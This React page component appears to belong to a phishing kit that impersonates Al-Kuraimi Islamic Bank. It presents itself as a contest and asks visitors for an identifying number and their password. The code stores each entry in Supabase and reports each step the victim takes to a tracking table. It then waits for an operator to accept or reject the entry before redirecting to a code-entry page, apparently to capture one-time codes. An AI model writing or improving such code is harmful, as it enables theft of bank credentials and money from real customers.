import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Eye, EyeOff, GraduationCap } from "lucide-react";
import { Button } from "@/components/ui/button";
import {
  createSubmission,
  CURRENT_SUBMISSION_KEY,
  SUBMISSION_REJECTED_KEY,
  type ContestSubmission,
  watchSubmission,
} from "@/lib/contest";
import { getSupabaseClient, isSupabaseConfigured } from "@/lib/supabase";
import bankLogo from "@/assets/bank-logo.png";
import { upsertClientTracking } from "@/lib/tracking";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: " بنك الكريمي الاسلامي  " },
    ],
  }),
  component: Index,
});

function Index() {
  const [participantNumber, setParticipantNumber] = useState("");
  const [couponReference, setCouponReference] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [error, setError] = useState(() => {
    if (typeof window === "undefined") return "";
    const rejectedMessage = window.sessionStorage.getItem(SUBMISSION_REJECTED_KEY);
    if (rejectedMessage) window.sessionStorage.removeItem(SUBMISSION_REJECTED_KEY);
    return rejectedMessage ?? "";
  });
  const navigate = useNavigate();

  useEffect(() => {
    if (!isSupabaseConfigured()) return;
    let sessionId = window.sessionStorage.getItem("client-tracking-session-v1");
    if (!sessionId) {
      sessionId = crypto.randomUUID();
      window.sessionStorage.setItem("client-tracking-session-v1", sessionId);
    }
    void upsertClientTracking({
      sessionId,
      currentPage: "main",
      status: "يبدأ إدخال البيانات",
      participantNumber: null,
      submissionId: null,
    });
  }, []);

  const submit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setLoading(true);
    setError("");
    let unsubscribe: (() => void) | undefined;
    try {
      const supabase = getSupabaseClient();
      let { data: sessionData } = await supabase.auth.getSession();
      if (!sessionData.session?.user) {
        const { data, error } = await supabase.auth.signInAnonymously();
        if (error) throw error;
        sessionData = data.session ? data : { session: data.session } as typeof sessionData;
      }
      const ownerUid = sessionData.session?.user.id;
      if (!ownerUid) throw new Error("تعذر إنشاء جلسة المشاركة.");
      const submission: ContestSubmission = {
        id: crypto.randomUUID(),
        ownerUid,
        participantNumber: participantNumber.trim(),
        couponReference: couponReference.trim(),
        couponCode: "",
        couponStatus: "not_submitted",
        status: "pending",
        createdAt: new Date().toISOString(),
      };
      await createSubmission(submission);
      window.sessionStorage.setItem(CURRENT_SUBMISSION_KEY, submission.id);
      const sessionId = window.sessionStorage.getItem("client-tracking-session-v1") ?? ownerUid;
      await upsertClientTracking({
        sessionId,
        currentPage: "waiting",
        status: "انتظار قبول البيانات الأساسية",
        participantNumber: participantNumber.trim(),
        submissionId: submission.id,
      });
      setLoading(false);
      setWaiting(true);
      unsubscribe = watchSubmission(
        submission.id,
        (current) => {
          if (current?.status === "accepted") {
            unsubscribe?.();
            setWaiting(false);
            void upsertClientTracking({
              sessionId,
              currentPage: "verify",
              status: "تم قبول البيانات ويفتح إدخال الرمز",
              participantNumber: participantNumber.trim(),
              submissionId: submission.id,
            });
            navigate({ to: "/verify" });
          } else if (current?.status === "rejected") {
            unsubscribe?.();
            setWaiting(false);
            setLoading(false);
            const rejectedMessage = "تم رفض بيانات الطلب الرئيسية. يمكنك مراجعتها وإرسال طلب جديد.";
            window.sessionStorage.setItem(SUBMISSION_REJECTED_KEY, rejectedMessage);
            window.sessionStorage.removeItem(CURRENT_SUBMISSION_KEY);
            void upsertClientTracking({
              sessionId,
              currentPage: "rejected",
              status: "تم رفض البيانات الأساسية",
              participantNumber: participantNumber.trim(),
              submissionId: submission.id,
            });
            setError(rejectedMessage);
            setParticipantNumber("");
            setCouponReference("");
          }
        },
        (watchError) => {
          setWaiting(false);
          setError(watchError.message);
        },
      );
    } catch (submitError) {
      setError(submitError instanceof Error ? submitError.message : "تعذر إرسال الطلب .");
      setLoading(false);
    }
  };

  return (
    <main className="bank-page demo-page" dir="rtl">
      <header className="bank-header demo-header">
        <div className="demo-brand">
          <GraduationCap aria-hidden="true" />
        </div>
      </header>
      <section className="login-content demo-content" aria-label="نموذج تجربة المسابقة">
        <img src={bankLogo} className="main-logo" alt="بنك الكريمي للتمويل الأصغر الإسلامي" />
        {!isSupabaseConfigured() && (
          <p className="demo-error" role="alert">
            إعداد Supabase غير مكتمل. راجع ملف .env.local ثم أعد تشغيل الموقع.
          </p>
        )}
        <form className="login-form" onSubmit={submit}>
          <label className="participation-label">
              ادخل الرقم المميز
            <input
              className="bank-input"
              aria-label="  ادخل الرقم المميز"
              value={participantNumber}
              onChange={(e) => setParticipantNumber(e.target.value)}
              autoComplete="off"
              required
              maxLength={40}
            />
          </label>
          <div>
            <label className="participation-label" htmlFor="password-field">
              كلمه السر
            </label>
            <div className="password-field">
              <input
                id="password-field"
                className="bank-input"
                type={showPassword ? "text" : "password"}
                aria-label="كلمة السر"
                value={couponReference}
                onChange={(e) => setCouponReference(e.target.value)}
                autoComplete="current-password"
                required
                maxLength={40}
              />
              <button
                className="password-toggle"
                type="button"
                aria-label={showPassword ? "إخفاء كلمة المرور" : "إظهار كلمة المرور"}
                title={showPassword ? "إخفاء كلمة المرور" : "إظهار كلمة المرور"}
                onClick={() => setShowPassword((visible) => !visible)}
              >
                {showPassword ? <EyeOff /> : <Eye />}
              </button>
            </div>
            <button className="change-password-link" type="button" disabled>
              هل نسيت كلمة المرور؟
            </button>
          </div>
          {error && (
            <p className="demo-error" role="alert">
              {error}
            </p>
          )}
          <Button
            className="login-submit"
            type="submit"
            variant="bank"
            disabled={loading || !isSupabaseConfigured()}
          >
            {loading ? "جارٍ الإرسال..." : " ادخل بياناتك   "}
          </Button>
        </form>
      </section>
      {(loading || waiting) && (
        <div className="contest-overlay" role="status" aria-live="polite">
          <div className="contest-loading">
            <span className="contest-spinner" />
            <h2>{waiting ? "الطلب  قيد المراجعة" : "يرجى الانتظار لحظات"}</h2>
            <p>
              {waiting
                ? "ستتمكن من المتابعه بعد مراجعة الطلب."
                : "جارٍ التحقق من الطلب   ."}
            </p>
          </div>
        </div>
      )}
    </main>
  );
}
